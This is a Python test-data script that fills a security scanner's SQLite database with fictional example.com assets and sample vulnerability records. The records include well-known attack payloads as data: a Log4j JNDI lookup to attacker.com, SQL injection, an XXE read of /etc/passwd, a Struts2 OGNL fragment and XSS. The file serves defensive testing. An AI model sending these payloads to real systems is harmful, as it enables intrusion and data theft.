"""
数据库充实脚本 - 生成全面的测试数据

目的：
1. 创建多样化的资产（不同域名和URL）
2. 生成真实的漏洞扫描结果
3. 添加各种严重级别的漏洞
4. 创建扫描历史记录
5. 测试去重、通知、报告生成功能
"""

import sqlite3
import json
import random
from datetime import datetime, timedelta
from pathlib import Path
from core.models import Vulnerability, Severity, VulnType

DB_PATH = Path(__file__).parent / "secbot_memory.db"


def create_test_assets():
    """创建多样化的测试资产 (URL格式)"""
    assets = [
        # 企业内部系统
        {
            "url": "http://internal-app-01.example.com:8080",
            "domain": "internal-app-01.example.com",
            "fingerprint": "Flask/1.0.0",
            "confidence": 0.95,
        },
        {
            "url": "https://api.example.com:443",
            "domain": "api.example.com",
            "fingerprint": "Django/3.2",
            "confidence": 0.98,
        },
        {
            "url": "http://staging-api.example.com:8080",
            "domain": "staging-api.example.com",
            "fingerprint": "FastAPI/0.95",
            "confidence": 0.90,
        },
        {
            "url": "https://admin.example.com:8888",
            "domain": "admin.example.com",
            "fingerprint": "Tomcat/9.0",
            "confidence": 0.85,
        },
        {
            "url": "http://backup.example.com:3000",
            "domain": "backup.example.com",
            "fingerprint": "Node.js/14.0",
            "confidence": 0.88,
        },
        # 公网资产
        {
            "url": "https://shop.example.com:443",
            "domain": "shop.example.com",
            "fingerprint": "WordPress/5.9",
            "confidence": 0.99,
        },
        {
            "url": "https://blog.example.com:443",
            "domain": "blog.example.com",
            "fingerprint": "WordPress/5.8",
            "confidence": 0.92,
        },
        {
            "url": "https://cdn.example.com:443",
            "domain": "cdn.example.com",
            "fingerprint": "nginx/1.21",
            "confidence": 0.97,
        },
        {
            "url": "https://mail.example.com:993",
            "domain": "mail.example.com",
            "fingerprint": "Postfix",
            "confidence": 0.96,
        },
        {
            "url": "https://vpn.example.com:443",
            "domain": "vpn.example.com",
            "fingerprint": "OpenVPN/2.5",
            "confidence": 0.87,
        },
    ]
    return assets


def create_test_vulnerabilities():
    """创建各种严重级别的漏洞"""
    vulns = [
        # CRITICAL 级别
        {
            "name": "Log4j2 JNDI RCE (CVE-2021-44228)",
            "type": VulnType.REMOTE_CODE_EXECUTION,
            "severity": Severity.CRITICAL,
            "confidence": 0.95,
            "description": "Apache Log4j2 JNDI injection vulnerability allowing remote code execution",
            "payload": "${jndi:ldap://attacker.com/a}",
            "cve": "CVE-2021-44228",
        },
        {
            "name": "SQL Injection in Login Form",
            "type": VulnType.SQL_INJECTION,
            "severity": Severity.CRITICAL,
            "confidence": 0.92,
            "description": "Unauthenticated SQL injection in user login form",
            "payload": "admin' OR '1'='1",
            "cve": None,
        },
        {
            "name": "Unauthenticated API Endpoint Exposure",
            "type": VulnType.AUTHENTICATION_BYPASS,
            "severity": Severity.CRITICAL,
            "confidence": 0.98,
            "description": "Sensitive API endpoints accessible without authentication",
            "payload": "/api/admin/users",
            "cve": None,
        },
        {
            "name": "Remote Code Execution via Template Injection",
            "type": VulnType.REMOTE_CODE_EXECUTION,
            "severity": Severity.CRITICAL,
            "confidence": 0.88,
            "description": "Server-side template injection leading to RCE",
            "payload": "{{7*7}}",
            "cve": None,
        },
        # HIGH 级别
        {
            "name": "Apache Struts2 RCE (CVE-2017-5638)",
            "type": VulnType.REMOTE_CODE_EXECUTION,
            "severity": Severity.HIGH,
            "confidence": 0.90,
            "description": "Struts2 REST plugin RCE via Content-Type header",
            "payload": "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)",
            "cve": "CVE-2017-5638",
        },
        {
            "name": "Sensitive Information Disclosure",
            "type": VulnType.INFORMATION_DISCLOSURE,
            "severity": Severity.HIGH,
            "confidence": 0.85,
            "description": "AWS credentials exposed in GitHub repositories",
            "payload": "/config.json",
            "cve": None,
        },
        {
            "name": "XXE Injection",
            "type": VulnType.REMOTE_CODE_EXECUTION,
            "severity": Severity.HIGH,
            "confidence": 0.87,
            "description": "XML External Entity injection in document upload",
            "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            "cve": None,
        },
        {
            "name": "Weak SSL/TLS Configuration",
            "type": VulnType.WEAK_CONFIGURATION,
            "severity": Severity.HIGH,
            "confidence": 0.92,
            "description": "SSL 3.0 and TLS 1.0 supported on server",
            "payload": None,
            "cve": "CVE-2014-3566",
        },
        # MEDIUM 级别
        {
            "name": "Cross-Site Scripting (Reflected)",
            "type": VulnType.CROSS_SITE_SCRIPTING,
            "severity": Severity.MEDIUM,
            "confidence": 0.89,
            "description": "Reflected XSS in search parameter",
            "payload": "<script>alert('XSS')</script>",
            "cve": None,
        },
        {
            "name": "Broken Authentication",
            "type": VulnType.AUTHENTICATION_BYPASS,
            "severity": Severity.MEDIUM,
            "confidence": 0.80,
            "description": "Default credentials still enabled",
            "payload": "admin:admin123",
            "cve": None,
        },
        {
            "name": "Missing Security Headers",
            "type": VulnType.WEAK_CONFIGURATION,
            "severity": Severity.MEDIUM,
            "confidence": 0.93,
            "description": "CSP, X-Frame-Options headers missing",
            "payload": None,
            "cve": None,
        },
        {
            "name": "Insecure Deserialization",
            "type": VulnType.REMOTE_CODE_EXECUTION,
            "severity": Severity.MEDIUM,
            "confidence": 0.78,
            "description": "Unsafe Java deserialization in RMI interface",
            "payload": "rO0ABXNy...",
            "cve": None,
        },
        # LOW 级别
        {
            "name": "Version Disclosure",
            "type": VulnType.INFORMATION_DISCLOSURE,
            "severity": Severity.LOW,
            "confidence": 0.95,
            "description": "Server reveals version information in headers",
            "payload": "Server: Apache/2.4.41",
            "cve": None,
        },
        {
            "name": "Outdated Library Usage",
            "type": VulnType.WEAK_CONFIGURATION,
            "severity": Severity.LOW,
            "confidence": 0.88,
            "description": "jQuery 1.5.2 (outdated, multiple vulnerabilities)",
            "payload": None,
            "cve": "CVE-2011-1487",
        },
    ]
    return vulns


def enrich_database():
    """充实测试数据库"""
    print("[+] 开始充实数据库...")

    if not DB_PATH.exists():
        print("[!] 数据库不存在，先初始化...")
        from core.database import init_database
        init_database()

    conn = sqlite3.connect(str(DB_PATH))
    cursor = conn.cursor()

    try:
        # 获取测试数据
        test_assets = create_test_assets()
        test_vulns = create_test_vulnerabilities()

        # 插入资产
        print(f"\n[*] 插入 {len(test_assets)} 个资产...")
        for asset in test_assets:
            insert_sql = """
                INSERT OR IGNORE INTO assets
                (url, domain, fingerprint, confidence, status, title, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """
            cursor.execute(
                insert_sql,
                (
                    asset["url"],
                    asset["domain"],
                    asset["fingerprint"],
                    asset["confidence"],
                    200,  # status code
                    asset["fingerprint"],  # title
                    datetime.now().isoformat(),
                    datetime.now().isoformat(),
                ),
            )
        conn.commit()
        print(f"[+] 成功插入 {len(test_assets)} 个资产")

        # 插入漏洞（每个资产分配随机漏洞）
        print(f"\n[*] 为资产分配漏洞...")
        inserted_vulns = 0

        for asset in test_assets:
            # 为该资产随机分配漏洞
            num_vulns = random.randint(2, 5)  # 每个资产2-5个漏洞
            selected_vulns = random.sample(test_vulns, min(num_vulns, len(test_vulns)))

            for vuln_template in selected_vulns:
                # 生成唯一的hash（模拟去重key）
                import hashlib
                vuln_hash = hashlib.md5(
                    f"{asset['url']}_{vuln_template['name']}".encode()
                ).hexdigest()

                # 检查去重
                cursor.execute("SELECT vuln_hash FROM vulnerabilities WHERE vuln_hash = ?", (vuln_hash,))
                if cursor.fetchone():
                    continue  # 跳过重复

                insert_sql = """
                    INSERT INTO vulnerabilities
                    (vuln_hash, url, domain, vuln_name, vuln_type, severity, confidence, payload_url, discovered_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                """
                # 随机发现日期（过去30天内）
                days_ago = random.randint(0, 30)
                discovered_at = (datetime.now() - timedelta(days=days_ago)).isoformat()

                cursor.execute(
                    insert_sql,
                    (
                        vuln_hash,
                        asset["url"],
                        asset["domain"],
                        vuln_template["name"],
                        vuln_template["type"].value,
                        vuln_template["severity"].value,
                        vuln_template["confidence"],
                        vuln_template["payload"],
                        discovered_at,
                    ),
                )
                inserted_vulns += 1

        conn.commit()
        print(f"[+] 成功插入 {inserted_vulns} 个漏洞记录")

        # 统计信息
        cursor.execute("SELECT COUNT(*) FROM assets")
        asset_count = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM vulnerabilities")
        vuln_count = cursor.fetchone()[0]

        print(f"\n[+] 数据库充实完成！")
        print(f"    资产数: {asset_count}")
        print(f"    漏洞数: {vuln_count}")

        # 显示漏洞统计
        cursor.execute("SELECT severity, COUNT(*) FROM vulnerabilities GROUP BY severity")
        print(f"\n[*] 漏洞级别分布:")
        for severity, count in cursor.fetchall():
            print(f"    {severity}: {count}")

    except Exception as e:
        print(f"[!] 数据库操作异常: {e}")
        import traceback
        traceback.print_exc()
        conn.rollback()
        raise
    finally:
        conn.close()


if __name__ == "__main__":
    enrich_database()
